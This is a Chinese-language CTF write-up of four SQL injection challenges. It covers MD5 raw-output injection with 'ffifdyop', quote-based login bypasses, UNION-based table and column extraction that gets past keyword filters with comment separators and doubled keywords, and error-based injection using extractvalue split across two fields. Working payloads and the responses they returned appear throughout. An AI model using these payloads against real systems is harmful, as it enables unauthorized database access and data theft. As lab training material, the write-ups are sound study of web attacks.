### Writeup for 后台登陆

注释中给出了后台PHP对password的执行过程

```PHP
$password=$_POST['password'];
$sql = "SELECT * FROM admin WHERE username = 'admin' and password = '".md5($password,true)."'";
$result=mysqli_query($link,$sql);
if(mysqli_num_rows($result)>0){
    echo 'flag is :'.$flag;
}
else{
	echo '密码错误!';
}
```

重点看一下SQL的构造

```PHP
$sql = "SELECT * FROM admin WHERE username = 'admin' and password = '".md5($password,true)."'";
// 注意这里'.是字符串拼接操作，md5这部分是可执行的
```

这里逻辑很清楚：需要检查`username='admin'`并且密码匹配的记录，也就是必须输入正确密码才能得到`flag`, 不过这里的SQL语句对用户输入很明显没有任何的过滤，考虑是否可能构造SQL注入。这里涉及到的操作是**MD5注入**(Injection inside MD5), 也就是需要构造一个输入使得其MD5之后的结果能够实现注入，这里我们（通过暴力搜索）可以得到一个很特别的字符串：

`md5('ffifdyop') = 'or'6É]é!`

md5后的结果恰好含有`'or'`！所以我们把这个字符串扔进去就可以实现SQL注入。





### Writeup for 登陆一下好吗??

尝试构造`' or '1`发现会被过滤掉，注意到两个字段均可以控制，尝试不含有`or`的构造`1'='0`或`'='`均可行.（这里机制暂时仍然不明确）







### WriteUp for 简单的sql注入

输入常规数据1,2,3发现有id和name数据，到4以后就没有id和name返回给前端了，但如果输入`1 1`仍然会返回和输入1相同的`name: baloteli`, 这暗示我们后台在取值时，如果用户输入有使用空格分隔的话，实际上是只取第一个字符串的。

输入一些sql关键字测试是否存在关键字过滤，例如构造输入`1 select from and or`（为什么第一个字符要写一个1？由于之前测试只找到1,2,3在数据库中有对应的值，因此即使不存在过滤，如果只构造`select from and or`数据库中由于没有`select`这个字段因而前端不会返回任何东西，所以必须扔一个1来保证前端有提示），发现`id`被过滤掉只剩下`1 or`, 中间的所有都被过滤了，这意味着什么呢？换个顺序测试一下发现`1 or and select from` 剩下的是`1 from`, 这意味着中间的东西会被过滤而两端的则不会，但"中间""两端"这种模糊用词要如何准确化呢？正则的经验告诉我们这可能和关键字之前和之后的空格有关，那么我们接着对空格进行测试：

构造输入`1 and1 from 2and or`（注意这里构造的技巧：保证存在三个关键字模式，分别满足仅前面有空格、前后都有空格、以及之后有空格）, 发现id剩下`1 and1 2or`, 这无疑意味着被关键模式是后部空格. 至此，我们可以确定这里被过滤掉的模式是`关键字+空格`. 

我们知道对于关键字过滤的应对方式无非是双写和注释，而对空格过滤的应对方式则有加号和注释。这里很显然只要不存在空格就匹配不到`关键字+空格`模式， 因此只需要使用注释来替代空格就好.



为了构造之后的注入语句，我们先写一下后台的sql语句的格式，大致应当是这样的形式

```sql
SELECT * FROM database where id = 'id'
```

这里`id`就是我们的输入.

现在我们完成了前期的过滤测试工作，接下来就是经典的`database->table->column->data`路线了：首先我们需要获得表名，于是构造`id`

```sql
'UNION/**/SELECT/**/database()'
```

注意到这里需要利用union来将前后的`SELECT`语句划分开，使得我们自己的`SELECT`子句成为一个独立的查询而不会受前面的影响，这样构造之后的查询语句成为

```sql
SELECT * FROM database where id = '' UNION SELECT database() ''
```

这里最后多了一个单引号似乎有些奇怪，但是实验发现确实是不影响结果的，所以就单纯闭合掉就行。

拿到了数据库名`web1`之后通常自然需要接下来爆表名，于是构造`id`为

```sql
'union/**/select/**/table_name from/**/information_schema.tables/**/where/**/table_schema/**/='web1
```

但是这时候突然出现了语法错误，经过测试知道`table_schema`这个关键字被强制过滤了（和前面的关键字+空格不同，这个是直接匹配过滤的），那么接下来要怎么办呢？干脆就不用这个关键字好了，把所有的表都给爆出来

```sql
'union/**/select/**/table_name from/**/information_schema.tables/**/where'1'='1
```

注意到这里最后闭合`'`是必须用where子句的，和前面不同（前面`SELECT database()`用`where`子句反而会出问题），似乎是两个查询语句不同语法规则限制的问题。

在得到的所有表中我们发现有一个叫做`flag`的，于是我们继续对这个表爆字段，构造`id`为：

```sql
'union/**/select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name/**/='flag
```

返回页面信息为

```html
<pre>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'from/**//**/where/**/table_name/**/='flag'' at line 1</pre>
```

看起来似乎连`column_name`和`information_schema.columns`都被滤掉了（之前字段`information_schema.tables`并没有被这么严苛地滤掉，看起来真的是越到后面的步骤要用到的绕过方法越多了orz），考虑一下用交叉双写：

```sql
'union/**/select/**/column_nacolumn_nameme/**/from/**/information_scheminformation_schema.columnsa.columns/**/where/**/table_name/**/='flag
```

成功得到字段名

```html
<pre>ID:'union/**/select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name/**/='flag
<br>name: flag
</pre>
<pre>ID:'union/**/select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name/**/='flag
<br>name: id
</pre>
```

字段名也是`flag`. 这意味着我们需要从数据库里找`flag`表地`flag`字段，构造语句

```sql
'union/**/select/**/flag/**/from/**/flag/**/where/**/'1'='1
```

得到返回值

```html
<pre>ID: 'union/**/select/**/flag from/**/flag where/**/'1'='1
<br>name: flag{Y0u_@r3_5O_dAmn_90Od}
</pre>
```







### Writeup for 加了料的报错注入

先对两个注入点进行测试，寻找可能的过滤模式：

正常情况下（`username=123`, `password=123`）返回页面信息为Login failed

`username`存在`--`时，或者写成`'or'1'='1`会被直接检测到sql injection.
由于题目提示报错注入，尝试报错注入，在`username`和`password`中构造报错语句，但在`username`中写报错语句会返回`User name unknow error.` 在`password`中写报错语句会返回`Unknown password error.`进一步的测试表明：`username`会检测到括号，而`password`会检测到报错函数名，既然我们已经同时掌握了二者，那么我们可以通过注释的方式避免掉中间其他字符的影响，从而将两方面的检测漏洞结合起来实现报错注入的效果：

构造username为`'or extractvalue /*`, 构造password为`*/(1, concat(0x5c, (select database()))) or '`, 使得最后构造出的sql查询语句成为

```sql
username = '' or extractvalue /* ' and password = ' */ (1, concat(0x5c, select database())) or ''
```

这里似乎不需要去可以规避惰性求值的问题：即使构造使得前面部分为`username = '1' or`而非空字符串，后面的报错语句也仍然会被执行.

在数据库结构完全未知的情况下，数据的获取显然需要通过数据库名->表名->字段名->数据一步一步来获取，在获得了数据库名为`error_based_hpf`之后就需要逐步沿着这条思路往下在concat的第二个参数中构造相应的sql语句

```sql
SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema regexp 'error_based_hpf'
```

注意到这里有一个小trick: 在输入中等号会被过滤掉，因而使用`regexp`绕过

获得`error_based_hpf`库中的表名：`ffll44jj`, `users`. 显然这里的`ffll44jj`是数据表，继续爆字段名：

```sql
SELECT group_concat(column_name) FROM information_schema.columns where table_name regexp 'ffll44jj'
```

得到字段名`value`， 从而

```sql
SELECT value FROM ffll44jj
```

得到`flag{err0r_b4sed_sqli_+_hpf}`